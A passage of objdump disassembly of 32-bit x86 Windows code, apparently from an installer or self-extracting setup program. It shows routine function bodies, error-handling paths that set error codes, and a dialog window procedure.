  402a87:	eb dc                	jmp    0x402a65
  402a89:	8b ff                	mov    %edi,%edi
  402a8b:	55                   	push   %ebp
  402a8c:	8b ec                	mov    %esp,%ebp
  402a8e:	3b 4d 08             	cmp    0x8(%ebp),%ecx
  402a91:	72 12                	jb     0x402aa5
  402a93:	77 0b                	ja     0x402aa0
  402a95:	3b 55 0c             	cmp    0xc(%ebp),%edx
  402a98:	72 0b                	jb     0x402aa5
  402a9a:	77 04                	ja     0x402aa0
  402a9c:	33 c0                	xor    %eax,%eax
  402a9e:	eb 08                	jmp    0x402aa8
  402aa0:	33 c0                	xor    %eax,%eax
  402aa2:	40                   	inc    %eax
  402aa3:	eb 03                	jmp    0x402aa8
  402aa5:	83 c8 ff             	or     $0xffffffff,%eax
  402aa8:	5d                   	pop    %ebp
  402aa9:	c2 08 00             	ret    $0x8
  402aac:	8b ff                	mov    %edi,%edi
  402aae:	55                   	push   %ebp
  402aaf:	8b ec                	mov    %esp,%ebp
  402ab1:	81 ec 08 01 00 00    	sub    $0x108,%esp
  402ab7:	a1 04 80 40 00       	mov    0x408004,%eax
  402abc:	33 c5                	xor    %ebp,%eax
  402abe:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402ac1:	53                   	push   %ebx
  402ac2:	56                   	push   %esi
  402ac3:	8b 75 08             	mov    0x8(%ebp),%esi
  402ac6:	8b da                	mov    %edx,%ebx
  402ac8:	57                   	push   %edi
  402ac9:	8b f9                	mov    %ecx,%edi
  402acb:	80 3f 00             	cmpb   $0x0,(%edi)
  402ace:	0f 84 14 01 00 00    	je     0x402be8
  402ad4:	68 04 01 00 00       	push   $0x104
  402ad9:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
  402adf:	50                   	push   %eax
  402ae0:	ff 35 3c 9a 40 00    	push   0x409a3c
  402ae6:	ff 15 9c a1 40 00    	call   *0x40a19c
  402aec:	e9 eb 00 00 00       	jmp    0x402bdc
  402af1:	50                   	push   %eax
  402af2:	ff 15 90 a0 40 00    	call   *0x40a090
  402af8:	8b c8                	mov    %eax,%ecx
  402afa:	8a 07                	mov    (%edi),%al
  402afc:	88 06                	mov    %al,(%esi)
  402afe:	85 c9                	test   %ecx,%ecx
  402b00:	74 06                	je     0x402b08
  402b02:	8a 47 01             	mov    0x1(%edi),%al
  402b05:	88 46 01             	mov    %al,0x1(%esi)
  402b08:	80 3f 23             	cmpb   $0x23,(%edi)
  402b0b:	0f 85 b9 00 00 00    	jne    0x402bca
  402b11:	57                   	push   %edi
  402b12:	ff 15 ec a1 40 00    	call   *0x40a1ec
  402b18:	8b f8                	mov    %eax,%edi
  402b1a:	0f be 0f             	movsbl (%edi),%ecx
  402b1d:	51                   	push   %ecx
  402b1e:	ff 15 d0 a1 40 00    	call   *0x40a1d0
  402b24:	3c 44                	cmp    $0x44,%al
  402b26:	75 65                	jne    0x402b8d
  402b28:	8d 8d f8 fe ff ff    	lea    -0x108(%ebp),%ecx
  402b2e:	e8 b5 3a 00 00       	call   0x4065e8
  402b33:	8d 8d f8 fe ff ff    	lea    -0x108(%ebp),%ecx
  402b39:	8d 51 01             	lea    0x1(%ecx),%edx
  402b3c:	8a 01                	mov    (%ecx),%al
  402b3e:	41                   	inc    %ecx
  402b3f:	84 c0                	test   %al,%al
  402b41:	75 f9                	jne    0x402b3c
  402b43:	2b ca                	sub    %edx,%ecx
  402b45:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
  402b4b:	03 c1                	add    %ecx,%eax
  402b4d:	50                   	push   %eax
  402b4e:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
  402b54:	50                   	push   %eax
  402b55:	ff 15 e4 a1 40 00    	call   *0x40a1e4
  402b5b:	85 c0                	test   %eax,%eax
  402b5d:	74 08                	je     0x402b67
  402b5f:	80 38 5c             	cmpb   $0x5c,(%eax)
  402b62:	75 03                	jne    0x402b67
  402b64:	c6 00 00             	movb   $0x0,(%eax)
  402b67:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
  402b6d:	8b cb                	mov    %ebx,%ecx
  402b6f:	50                   	push   %eax
  402b70:	56                   	push   %esi
  402b71:	e8 52 ec ff ff       	call   0x4017c8
  402b76:	8b d0                	mov    %eax,%edx
  402b78:	8b ce                	mov    %esi,%ecx
  402b7a:	e8 01 eb ff ff       	call   0x401680
  402b7f:	8b ce                	mov    %esi,%ecx
  402b81:	8d 51 01             	lea    0x1(%ecx),%edx
  402b84:	8a 01                	mov    (%ecx),%al
  402b86:	41                   	inc    %ecx
  402b87:	84 c0                	test   %al,%al
  402b89:	75 f9                	jne    0x402b84
  402b8b:	eb 32                	jmp    0x402bbf
  402b8d:	0f be 07             	movsbl (%edi),%eax
  402b90:	50                   	push   %eax
  402b91:	ff 15 d0 a1 40 00    	call   *0x40a1d0
  402b97:	3c 45                	cmp    $0x45,%al
  402b99:	75 2a                	jne    0x402bc5
  402b9b:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
  402ba1:	8b cb                	mov    %ebx,%ecx
  402ba3:	50                   	push   %eax
  402ba4:	56                   	push   %esi
  402ba5:	e8 1e ec ff ff       	call   0x4017c8
  402baa:	8b d0                	mov    %eax,%edx
  402bac:	8b ce                	mov    %esi,%ecx
  402bae:	e8 cd ea ff ff       	call   0x401680
  402bb3:	8b ce                	mov    %esi,%ecx
  402bb5:	8d 51 01             	lea    0x1(%ecx),%edx
  402bb8:	8a 01                	mov    (%ecx),%al
  402bba:	41                   	inc    %ecx
  402bbb:	84 c0                	test   %al,%al
  402bbd:	75 f9                	jne    0x402bb8
  402bbf:	2b ca                	sub    %edx,%ecx
  402bc1:	03 f1                	add    %ecx,%esi
  402bc3:	eb 0e                	jmp    0x402bd3
  402bc5:	80 3f 23             	cmpb   $0x23,(%edi)
  402bc8:	75 09                	jne    0x402bd3
  402bca:	56                   	push   %esi
  402bcb:	ff 15 ec a1 40 00    	call   *0x40a1ec
  402bd1:	8b f0                	mov    %eax,%esi
  402bd3:	57                   	push   %edi
  402bd4:	ff 15 ec a1 40 00    	call   *0x40a1ec
  402bda:	8b f8                	mov    %eax,%edi
  402bdc:	8a 07                	mov    (%edi),%al
  402bde:	84 c0                	test   %al,%al
  402be0:	0f 85 0b ff ff ff    	jne    0x402af1
  402be6:	88 06                	mov    %al,(%esi)
  402be8:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  402beb:	5f                   	pop    %edi
  402bec:	5e                   	pop    %esi
  402bed:	33 cd                	xor    %ebp,%ecx
  402bef:	5b                   	pop    %ebx
  402bf0:	e8 eb 40 00 00       	call   0x406ce0
  402bf5:	8b e5                	mov    %ebp,%esp
  402bf7:	5d                   	pop    %ebp
  402bf8:	c2 04 00             	ret    $0x4
  402bfb:	8b ff                	mov    %edi,%edi
  402bfd:	55                   	push   %ebp
  402bfe:	8b ec                	mov    %esp,%ebp
  402c00:	53                   	push   %ebx
  402c01:	56                   	push   %esi
  402c02:	57                   	push   %edi
  402c03:	ff 15 f8 a0 40 00    	call   *0x40a0f8
  402c09:	33 db                	xor    %ebx,%ebx
  402c0b:	85 c0                	test   %eax,%eax
  402c0d:	78 41                	js     0x402c50
  402c0f:	3c 06                	cmp    $0x6,%al
  402c11:	72 3d                	jb     0x402c50
  402c13:	68 48 12 40 00       	push   $0x401248
  402c18:	ff 15 30 a1 40 00    	call   *0x40a130
  402c1e:	85 c0                	test   %eax,%eax
  402c20:	74 2e                	je     0x402c50
  402c22:	68 64 12 40 00       	push   $0x401264
  402c27:	50                   	push   %eax
  402c28:	ff 15 9c a0 40 00    	call   *0x40a09c
  402c2e:	8b f8                	mov    %eax,%edi
  402c30:	85 ff                	test   %edi,%edi
  402c32:	74 1c                	je     0x402c50
  402c34:	8b f4                	mov    %esp,%esi
  402c36:	8b cf                	mov    %edi,%ecx
  402c38:	53                   	push   %ebx
  402c39:	53                   	push   %ebx
  402c3a:	6a 01                	push   $0x1
  402c3c:	53                   	push   %ebx
  402c3d:	ff 15 88 a2 40 00    	call   *0x40a288
  402c43:	ff d7                	call   *%edi
  402c45:	3b f4                	cmp    %esp,%esi
  402c47:	74 07                	je     0x402c50
  402c49:	b9 04 00 00 00       	mov    $0x4,%ecx
  402c4e:	cd 29                	int    $0x29
  402c50:	8b 55 10             	mov    0x10(%ebp),%edx
  402c53:	51                   	push   %ecx
  402c54:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402c57:	89 1d 24 91 40 00    	mov    %ebx,0x409124
  402c5d:	e8 48 00 00 00       	call   0x402caa
  402c62:	85 c0                	test   %eax,%eax
  402c64:	74 28                	je     0x402c8e
  402c66:	e8 b2 02 00 00       	call   0x402f1d
  402c6b:	8b f0                	mov    %eax,%esi
  402c6d:	e8 44 26 00 00       	call   0x4052b6
  402c72:	85 f6                	test   %esi,%esi
  402c74:	74 18                	je     0x402c8e
  402c76:	38 1d 3a 8a 40 00    	cmp    %bl,0x408a3a
  402c7c:	75 10                	jne    0x402c8e
  402c7e:	8b 0d 2c 9a 40 00    	mov    0x409a2c,%ecx
  402c84:	f6 c1 01             	test   $0x1,%cl
  402c87:	74 05                	je     0x402c8e
  402c89:	e8 02 f3 ff ff       	call   0x401f90
  402c8e:	a1 88 85 40 00       	mov    0x408588,%eax
  402c93:	85 c0                	test   %eax,%eax
  402c95:	74 07                	je     0x402c9e
  402c97:	50                   	push   %eax
  402c98:	ff 15 88 a0 40 00    	call   *0x40a088
  402c9e:	a1 24 91 40 00       	mov    0x409124,%eax
  402ca3:	5f                   	pop    %edi
  402ca4:	5e                   	pop    %esi
  402ca5:	5b                   	pop    %ebx
  402ca6:	5d                   	pop    %ebp
  402ca7:	c2 10 00             	ret    $0x10
  402caa:	8b ff                	mov    %edi,%edi
  402cac:	55                   	push   %ebp
  402cad:	8b ec                	mov    %esp,%ebp
  402caf:	81 ec 08 01 00 00    	sub    $0x108,%esp
  402cb5:	a1 04 80 40 00       	mov    0x408004,%eax
  402cba:	33 c5                	xor    %ebp,%eax
  402cbc:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402cbf:	53                   	push   %ebx
  402cc0:	56                   	push   %esi
  402cc1:	57                   	push   %edi
  402cc2:	68 fc 08 00 00       	push   $0x8fc
  402cc7:	33 ff                	xor    %edi,%edi
  402cc9:	8b f1                	mov    %ecx,%esi
  402ccb:	57                   	push   %edi
  402ccc:	68 40 91 40 00       	push   $0x409140
  402cd1:	8b da                	mov    %edx,%ebx
  402cd3:	89 35 3c 9a 40 00    	mov    %esi,0x409a3c
  402cd9:	e8 d1 45 00 00       	call   0x4072af
  402cde:	68 2c 03 00 00       	push   $0x32c
  402ce3:	57                   	push   %edi
  402ce4:	68 20 8a 40 00       	push   $0x408a20
  402ce9:	e8 c1 45 00 00       	call   0x4072af
  402cee:	68 04 01 00 00       	push   $0x104
  402cf3:	57                   	push   %edi
  402cf4:	68 c0 88 40 00       	push   $0x4088c0
  402cf9:	e8 b1 45 00 00       	call   0x4072af
  402cfe:	83 c4 24             	add    $0x24,%esp
  402d01:	33 c0                	xor    %eax,%eax
  402d03:	40                   	inc    %eax
  402d04:	ba 54 91 40 00       	mov    $0x409154,%edx
  402d09:	b9 78 12 40 00       	mov    $0x401278,%ecx
  402d0e:	a3 ec 93 40 00       	mov    %eax,0x4093ec
  402d13:	6a 7f                	push   $0x7f
  402d15:	e8 75 19 00 00       	call   0x40468f
  402d1a:	85 c0                	test   %eax,%eax
  402d1c:	0f 84 d1 01 00 00    	je     0x402ef3
  402d22:	3d 80 00 00 00       	cmp    $0x80,%eax
  402d27:	0f 87 c6 01 00 00    	ja     0x402ef3
  402d2d:	57                   	push   %edi
  402d2e:	33 c0                	xor    %eax,%eax
  402d30:	40                   	inc    %eax
  402d31:	50                   	push   %eax
  402d32:	50                   	push   %eax
  402d33:	57                   	push   %edi
  402d34:	ff 15 44 a1 40 00    	call   *0x40a144
  402d3a:	50                   	push   %eax
  402d3b:	a3 8c 85 40 00       	mov    %eax,0x40858c
  402d40:	ff 15 0c a1 40 00    	call   *0x40a10c
  402d46:	6a 04                	push   $0x4
  402d48:	ba 34 9a 40 00       	mov    $0x409a34,%edx
  402d4d:	b9 80 12 40 00       	mov    $0x401280,%ecx
  402d52:	e8 38 19 00 00       	call   0x40468f
  402d57:	85 c0                	test   %eax,%eax
  402d59:	75 22                	jne    0x402d7d
  402d5b:	33 c0                	xor    %eax,%eax
  402d5d:	ba b1 04 00 00       	mov    $0x4b1,%edx
  402d62:	50                   	push   %eax
  402d63:	6a 10                	push   $0x10
  402d65:	50                   	push   %eax
  402d66:	50                   	push   %eax
  402d67:	33 c9                	xor    %ecx,%ecx
  402d69:	e8 4b 17 00 00       	call   0x4044b9
  402d6e:	c7 05 24 91 40 00 14 	movl   $0x80070714,0x409124
  402d75:	07 07 80 
  402d78:	e9 89 01 00 00       	jmp    0x402f06
  402d7d:	f6 05 34 9a 40 00 c0 	testb  $0xc0,0x409a34
  402d84:	0f 84 95 00 00 00    	je     0x402e1f
  402d8a:	68 04 01 00 00       	push   $0x104
  402d8f:	8d 95 f8 fe ff ff    	lea    -0x108(%ebp),%edx
  402d95:	b9 8c 12 40 00       	mov    $0x40128c,%ecx
  402d9a:	e8 f0 18 00 00       	call   0x40468f
  402d9f:	85 c0                	test   %eax,%eax
  402da1:	74 b8                	je     0x402d5b
  402da3:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
  402da9:	50                   	push   %eax
  402daa:	6a 01                	push   $0x1
  402dac:	6a 00                	push   $0x0
  402dae:	ff 15 e4 a0 40 00    	call   *0x40a0e4
  402db4:	a3 88 85 40 00       	mov    %eax,0x408588
  402db9:	85 c0                	test   %eax,%eax
  402dbb:	74 62                	je     0x402e1f
  402dbd:	ff 15 6c a0 40 00    	call   *0x40a06c
  402dc3:	3d b7 00 00 00       	cmp    $0xb7,%eax
  402dc8:	75 55                	jne    0x402e1f
  402dca:	33 c9                	xor    %ecx,%ecx
  402dcc:	f6 05 34 9a 40 00 80 	testb  $0x80,0x409a34
  402dd3:	74 15                	je     0x402dea
  402dd5:	51                   	push   %ecx
  402dd6:	6a 10                	push   $0x10
  402dd8:	51                   	push   %ecx
  402dd9:	68 54 91 40 00       	push   $0x409154
  402dde:	ba 4b 05 00 00       	mov    $0x54b,%edx
  402de3:	e8 d1 16 00 00       	call   0x4044b9
  402de8:	eb 1a                	jmp    0x402e04
  402dea:	6a 04                	push   $0x4
  402dec:	6a 20                	push   $0x20
  402dee:	6a 00                	push   $0x0
  402df0:	68 54 91 40 00       	push   $0x409154
  402df5:	ba 24 05 00 00       	mov    $0x524,%edx
  402dfa:	e8 ba 16 00 00       	call   0x4044b9
  402dff:	83 f8 06             	cmp    $0x6,%eax
  402e02:	74 1b                	je     0x402e1f
  402e04:	ff 35 88 85 40 00    	push   0x408588
  402e0a:	ff 15 88 a0 40 00    	call   *0x40a088
  402e10:	c7 05 24 91 40 00 b7 	movl   $0x800700b7,0x409124
  402e17:	00 07 80 
  402e1a:	e9 e7 00 00 00       	jmp    0x402f06
  402e1f:	21 3d 20 91 40 00    	and    %edi,0x409120
  402e25:	8b cb                	mov    %ebx,%ecx
  402e27:	e8 72 2e 00 00       	call   0x405c9e
  402e2c:	85 c0                	test   %eax,%eax
  402e2e:	75 0a                	jne    0x402e3a
  402e30:	ba 20 05 00 00       	mov    $0x520,%edx
  402e35:	e9 be 00 00 00       	jmp    0x402ef8
  402e3a:	80 3d 3a 8a 40 00 00 	cmpb   $0x0,0x408a3a
  402e41:	74 0f                	je     0x402e52
  402e43:	b9 3a 8a 40 00       	mov    $0x408a3a,%ecx
  402e48:	e8 43 f5 ff ff       	call   0x402390
  402e4d:	e9 b4 00 00 00       	jmp    0x402f06
  402e52:	6a 0a                	push   $0xa
  402e54:	68 9c 12 40 00       	push   $0x40129c
  402e59:	56                   	push   %esi
  402e5a:	ff 15 e0 a0 40 00    	call   *0x40a0e0
  402e60:	85 c0                	test   %eax,%eax
  402e62:	74 0a                	je     0x402e6e
  402e64:	50                   	push   %eax
  402e65:	56                   	push   %esi
  402e66:	ff 15 28 a1 40 00    	call   *0x40a128
  402e6c:	8b f8                	mov    %eax,%edi
  402e6e:	83 3d 84 81 40 00 00 	cmpl   $0x0,0x408184
  402e75:	74 06                	je     0x402e7d
  402e77:	ff 15 3c a0 40 00    	call   *0x40a03c
  402e7d:	83 3d 24 8a 40 00 00 	cmpl   $0x0,0x408a24
  402e84:	74 05                	je     0x402e8b
  402e86:	33 c0                	xor    %eax,%eax
  402e88:	40                   	inc    %eax
  402e89:	eb 7d                	jmp    0x402f08
  402e8b:	8b cf                	mov    %edi,%ecx
  402e8d:	e8 5c 08 00 00       	call   0x4036ee
  402e92:	85 c0                	test   %eax,%eax
  402e94:	74 70                	je     0x402f06
  402e96:	66 a1 40 9a 40 00    	mov    0x409a40,%ax
  402e9c:	33 db                	xor    %ebx,%ebx
  402e9e:	43                   	inc    %ebx
  402e9f:	66 3b c3             	cmp    %bx,%ax
  402ea2:	74 0c                	je     0x402eb0
  402ea4:	66 83 f8 02          	cmp    $0x2,%ax
  402ea8:	74 06                	je     0x402eb0
  402eaa:	66 83 f8 03          	cmp    $0x3,%ax
  402eae:	75 3f                	jne    0x402eef
  402eb0:	f7 05 34 9a 40 00 00 	testl  $0x100,0x409a34
  402eb7:	01 00 00 
  402eba:	74 33                	je     0x402eef
  402ebc:	f6 05 38 8a 40 00 01 	testb  $0x1,0x408a38
  402ec3:	75 2a                	jne    0x402eef
  402ec5:	e8 d9 e9 ff ff       	call   0x4018a3
  402eca:	85 c0                	test   %eax,%eax
  402ecc:	75 21                	jne    0x402eef
  402ece:	68 3e 08 00 00       	push   $0x83e
  402ed3:	68 47 05 00 00       	push   $0x547
  402ed8:	68 e0 19 40 00       	push   $0x4019e0
  402edd:	50                   	push   %eax
  402ede:	ba d6 07 00 00       	mov    $0x7d6,%edx
  402ee3:	e8 2f 36 00 00       	call   0x406517
  402ee8:	3d 3d 08 00 00       	cmp    $0x83d,%eax
  402eed:	75 17                	jne    0x402f06
  402eef:	8b c3                	mov    %ebx,%eax
  402ef1:	eb 15                	jmp    0x402f08
  402ef3:	ba b1 04 00 00       	mov    $0x4b1,%edx
  402ef8:	33 c0                	xor    %eax,%eax
  402efa:	33 c9                	xor    %ecx,%ecx
  402efc:	50                   	push   %eax
  402efd:	6a 10                	push   $0x10
  402eff:	50                   	push   %eax
  402f00:	50                   	push   %eax
  402f01:	e8 b3 15 00 00       	call   0x4044b9
  402f06:	33 c0                	xor    %eax,%eax
  402f08:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  402f0b:	5f                   	pop    %edi
  402f0c:	5e                   	pop    %esi
  402f0d:	33 cd                	xor    %ebp,%ecx
  402f0f:	5b                   	pop    %ebx
  402f10:	e8 cb 3d 00 00       	call   0x406ce0
  402f15:	8b e5                	mov    %ebp,%esp
  402f17:	5d                   	pop    %ebp
  402f18:	c2 04 00             	ret    $0x4
  402f1b:	cc                   	int3
  402f1c:	cc                   	int3
  402f1d:	8b ff                	mov    %edi,%edi
  402f1f:	55                   	push   %ebp
  402f20:	8b ec                	mov    %esp,%ebp
  402f22:	81 ec 10 01 00 00    	sub    $0x110,%esp
  402f28:	a1 04 80 40 00       	mov    0x408004,%eax
  402f2d:	33 c5                	xor    %ebp,%eax
  402f2f:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402f32:	66 83 3d 38 8a 40 00 	cmpw   $0x0,0x408a38
  402f39:	00 
  402f3a:	53                   	push   %ebx
  402f3b:	56                   	push   %esi
  402f3c:	57                   	push   %edi
  402f3d:	75 2d                	jne    0x402f6c
  402f3f:	83 3d 24 8a 40 00 00 	cmpl   $0x0,0x408a24
  402f46:	75 17                	jne    0x402f5f
  402f48:	e8 98 22 00 00       	call   0x4051e5
  402f4d:	85 c0                	test   %eax,%eax
  402f4f:	0f 84 ec 00 00 00    	je     0x403041
  402f55:	66 83 3d 38 8a 40 00 	cmpw   $0x0,0x408a38
  402f5c:	00 
  402f5d:	75 0d                	jne    0x402f6c
  402f5f:	e8 db 0a 00 00       	call   0x403a3f
  402f64:	85 c0                	test   %eax,%eax
  402f66:	0f 84 d5 00 00 00    	je     0x403041
  402f6c:	e8 f3 21 00 00       	call   0x405164
  402f71:	85 c0                	test   %eax,%eax
  402f73:	0f 84 c8 00 00 00    	je     0x403041
  402f79:	e8 22 26 00 00       	call   0x4055a0
  402f7e:	85 c0                	test   %eax,%eax
  402f80:	0f 84 bb 00 00 00    	je     0x403041
  402f86:	be 05 01 00 00       	mov    $0x105,%esi
  402f8b:	8d 85 f4 fe ff ff    	lea    -0x10c(%ebp),%eax
  402f91:	56                   	push   %esi
  402f92:	50                   	push   %eax
  402f93:	ff 15 74 a0 40 00    	call   *0x40a074
  402f99:	68 44 11 40 00       	push   $0x401144
  402f9e:	8b d6                	mov    %esi,%edx
  402fa0:	8d 8d f4 fe ff ff    	lea    -0x10c(%ebp),%ecx
  402fa6:	e8 df 35 00 00       	call   0x40658a
  402fab:	8d 85 f4 fe ff ff    	lea    -0x10c(%ebp),%eax
  402fb1:	50                   	push   %eax
  402fb2:	ff 15 78 a0 40 00    	call   *0x40a078
  402fb8:	8b d8                	mov    %eax,%ebx
  402fba:	33 ff                	xor    %edi,%edi
  402fbc:	85 db                	test   %ebx,%ebx
  402fbe:	74 37                	je     0x402ff7
  402fc0:	68 a8 12 40 00       	push   $0x4012a8
  402fc5:	53                   	push   %ebx
  402fc6:	ff 15 9c a0 40 00    	call   *0x40a09c
  402fcc:	89 85 f0 fe ff ff    	mov    %eax,-0x110(%ebp)
  402fd2:	85 c0                	test   %eax,%eax
  402fd4:	74 21                	je     0x402ff7
  402fd6:	8b f4                	mov    %esp,%esi
  402fd8:	8b c8                	mov    %eax,%ecx
  402fda:	57                   	push   %edi
  402fdb:	68 e4 91 40 00       	push   $0x4091e4
  402fe0:	ff 15 88 a2 40 00    	call   *0x40a288
  402fe6:	ff 95 f0 fe ff ff    	call   *-0x110(%ebp)
  402fec:	3b f4                	cmp    %esp,%esi
  402fee:	74 07                	je     0x402ff7
  402ff0:	b9 04 00 00 00       	mov    $0x4,%ecx
  402ff5:	cd 29                	int    $0x29
  402ff7:	53                   	push   %ebx
  402ff8:	ff 15 ac a0 40 00    	call   *0x40a0ac
  402ffe:	39 3d 24 8a 40 00    	cmp    %edi,0x408a24
  403004:	75 11                	jne    0x403017
  403006:	39 3d 30 9a 40 00    	cmp    %edi,0x409a30
  40300c:	75 09                	jne    0x403017
  40300e:	e8 0b 32 00 00       	call   0x40621e
  403013:	85 c0                	test   %eax,%eax
  403015:	74 2a                	je     0x403041
  403017:	68 e4 91 40 00       	push   $0x4091e4
  40301c:	ff 15 fc a0 40 00    	call   *0x40a0fc
  403022:	85 c0                	test   %eax,%eax
  403024:	75 2e                	jne    0x403054
  403026:	57                   	push   %edi
  403027:	6a 10                	push   $0x10
  403029:	57                   	push   %edi
  40302a:	57                   	push   %edi
  40302b:	ba bc 04 00 00       	mov    $0x4bc,%edx
  403030:	33 c9                	xor    %ecx,%ecx
  403032:	e8 82 14 00 00       	call   0x4044b9
  403037:	e8 49 32 00 00       	call   0x406285
  40303c:	a3 24 91 40 00       	mov    %eax,0x409124
  403041:	33 c0                	xor    %eax,%eax
  403043:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  403046:	5f                   	pop    %edi
  403047:	5e                   	pop    %esi
  403048:	33 cd                	xor    %ebp,%ecx
  40304a:	5b                   	pop    %ebx
  40304b:	e8 90 3c 00 00       	call   0x406ce0
  403050:	8b e5                	mov    %ebp,%esp
  403052:	5d                   	pop    %ebp
  403053:	c3                   	ret
  403054:	39 3d 2c 8a 40 00    	cmp    %edi,0x408a2c
  40305a:	75 09                	jne    0x403065
  40305c:	e8 c5 0a 00 00       	call   0x403b26
  403061:	85 c0                	test   %eax,%eax
  403063:	74 dc                	je     0x403041
  403065:	f6 05 48 8d 40 00 c0 	testb  $0xc0,0x408d48
  40306c:	75 0e                	jne    0x40307c
  40306e:	66 8b 0d 40 9a 40 00 	mov    0x409a40,%cx
  403075:	e8 f3 f4 ff ff       	call   0x40256d
  40307a:	8b f8                	mov    %eax,%edi
  40307c:	a1 24 8a 40 00       	mov    0x408a24,%eax
  403081:	89 3d 44 9a 40 00    	mov    %edi,0x409a44
  403087:	85 c0                	test   %eax,%eax
  403089:	75 16                	jne    0x4030a1
  40308b:	39 05 30 9a 40 00    	cmp    %eax,0x409a30
  403091:	75 0e                	jne    0x4030a1
  403093:	e8 0a 0b 00 00       	call   0x403ba2
  403098:	85 c0                	test   %eax,%eax
  40309a:	74 a5                	je     0x403041
  40309c:	a1 24 8a 40 00       	mov    0x408a24,%eax
  4030a1:	66 83 3d 38 8a 40 00 	cmpw   $0x0,0x408a38
  4030a8:	00 
  4030a9:	75 09                	jne    0x4030b4
  4030ab:	85 c0                	test   %eax,%eax
  4030ad:	75 05                	jne    0x4030b4
  4030af:	e8 b5 10 00 00       	call   0x404169
  4030b4:	33 c0                	xor    %eax,%eax
  4030b6:	40                   	inc    %eax
  4030b7:	eb 8a                	jmp    0x403043
  4030b9:	cc                   	int3
  4030ba:	cc                   	int3
  4030bb:	cc                   	int3
  4030bc:	cc                   	int3
  4030bd:	cc                   	int3
  4030be:	cc                   	int3
  4030bf:	cc                   	int3
  4030c0:	8b ff                	mov    %edi,%edi
  4030c2:	55                   	push   %ebp
  4030c3:	8b ec                	mov    %esp,%ebp
  4030c5:	81 7d 0c b1 00 00 00 	cmpl   $0xb1,0xc(%ebp)
  4030cc:	75 10                	jne    0x4030de
  4030ce:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  4030d2:	75 0a                	jne    0x4030de
  4030d4:	83 7d 14 fe          	cmpl   $0xfffffffe,0x14(%ebp)
  4030d8:	75 04                	jne    0x4030de
  4030da:	33 c0                	xor    %eax,%eax
  4030dc:	eb 18                	jmp    0x4030f6
  4030de:	ff 75 14             	push   0x14(%ebp)
  4030e1:	ff 75 10             	push   0x10(%ebp)
  4030e4:	ff 75 0c             	push   0xc(%ebp)
  4030e7:	ff 75 08             	push   0x8(%ebp)
  4030ea:	ff 35 b8 88 40 00    	push   0x4088b8
  4030f0:	ff 15 18 a2 40 00    	call   *0x40a218
  4030f6:	5d                   	pop    %ebp
  4030f7:	c2 10 00             	ret    $0x10
  4030fa:	cc                   	int3
  4030fb:	cc                   	int3
  4030fc:	cc                   	int3
  4030fd:	cc                   	int3
  4030fe:	cc                   	int3
  4030ff:	cc                   	int3
  403100:	8b ff                	mov    %edi,%edi
  403102:	55                   	push   %ebp
  403103:	8b ec                	mov    %esp,%ebp
  403105:	8b 45 0c             	mov    0xc(%ebp),%eax
  403108:	83 e8 0f             	sub    $0xf,%eax
  40310b:	0f 84 9f 00 00 00    	je     0x4031b0
  403111:	83 e8 01             	sub    $0x1,%eax
  403114:	74 20                	je     0x403136
  403116:	2d 00 01 00 00       	sub    $0x100,%eax
  40311b:	74 2c                	je     0x403149
  40311d:	83 e8 01             	sub    $0x1,%eax
  403120:	0f 85 b4 00 00 00    	jne    0x4031da
  403126:	83 7d 10 06          	cmpl   $0x6,0x10(%ebp)
  40312a:	75 04                	jne    0x403130
  40312c:	6a 01                	push   $0x1
  40312e:	eb 08                	jmp    0x403138
  403130:	83 7d 10 07          	cmpl   $0x7,0x10(%ebp)
  403134:	75 0b                	jne    0x403141
  403136:	6a 00                	push   $0x0
  403138:	ff 75 08             	push   0x8(%ebp)
  40313b:	ff 15 e0 a1 40 00    	call   *0x40a1e0
  403141:	33 c0                	xor    %eax,%eax
  403143:	40                   	inc    %eax
  403144:	e9 93 00 00 00       	jmp    0x4031dc
  403149:	56                   	push   %esi
  40314a:	57                   	push   %edi
  40314b:	ff 15 cc a1 40 00    	call   *0x40a1cc
  403151:	8b 75 08             	mov    0x8(%ebp),%esi
  403154:	8b d0                	mov    %eax,%edx
  403156:	8b ce                	mov    %esi,%ecx
  403158:	e8 73 12 00 00       	call   0x4043d0
  40315d:	ff 35 4c 8d 40 00    	push   0x408d4c
  403163:	bf 34 08 00 00       	mov    $0x834,%edi
  403168:	57                   	push   %edi
  403169:	56                   	push   %esi
  40316a:	ff 15 d4 a1 40 00    	call   *0x40a1d4
  403170:	68 54 91 40 00       	push   $0x409154
  403175:	56                   	push   %esi
  403176:	ff 15 10 a2 40 00    	call   *0x40a210
  40317c:	56                   	push   %esi
  40317d:	ff 15 f8 a1 40 00    	call   *0x40a1f8
  403183:	57                   	push   %edi
  403184:	56                   	push   %esi
  403185:	ff 15 00 a2 40 00    	call   *0x40a200
  40318b:	8b f0                	mov    %eax,%esi
  40318d:	6a fc                	push   $0xfffffffc
  40318f:	56                   	push   %esi
  403190:	ff 15 14 a2 40 00    	call   *0x40a214
  403196:	68 c0 30 40 00       	push   $0x4030c0
  40319b:	6a fc                	push   $0xfffffffc
  40319d:	56                   	push   %esi
  40319e:	a3 b8 88 40 00       	mov    %eax,0x4088b8
  4031a3:	ff 15 a8 a1 40 00    	call   *0x40a1a8
  4031a9:	33 c0                	xor    %eax,%eax
  4031ab:	5f                   	pop    %edi
  4031ac:	40                   	inc    %eax
  4031ad:	5e                   	pop    %esi
  4031ae:	eb 2c                	jmp    0x4031dc
  4031b0:	83 3d 90 85 40 00 00 	cmpl   $0x0,0x408590
  4031b7:	75 21                	jne    0x4031da
  4031b9:	6a 00                	push   $0x0
  4031bb:	6a ff                	push   $0xffffffff
  4031bd:	68 b1 00 00 00       	push   $0xb1
  4031c2:	68 34 08 00 00       	push   $0x834
  4031c7:	ff 75 08             	push   0x8(%ebp)
  4031ca:	ff 15 08 a2 40 00    	call   *0x40a208
